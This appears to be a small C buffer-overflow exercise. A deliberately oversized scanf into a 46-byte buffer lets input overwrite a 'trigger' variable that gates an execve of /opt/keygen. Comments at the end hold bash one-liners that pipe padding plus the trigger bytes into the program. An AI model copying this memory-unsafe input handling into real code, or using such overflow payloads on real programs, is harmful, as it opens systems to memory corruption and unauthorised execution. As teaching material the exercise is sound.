#include <stdio.h>

int main()
{
    long trigger = 0x43434343;
    char input[46];

    printf("What's my name, honey: ");
    scanf("%200s", &input);

    if (trigger == 0x594a5a48)
    {
        execve("/opt/keygen", NULL, NULL);
    }
    else
    {
        printf("Well, I guess that today you won't be the lucky one... Here is a hint for the next time:\n");
        printf("input: %s\n", input);
        printf("trigger: 0x%08x\n", trigger);
    }
    return 0;


// (bash -c 'echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x48\x5a\x4a\x59"'; ls) | ./exercise

// \x48\x5a\x4a\x59

// AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

// AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

// (bash -c 'echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x48\x5a\x4a\x59"'; ls) | ./exercise

// (bash -c 'echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x48\x5a\x4a\x59"'; ls) | ./exercise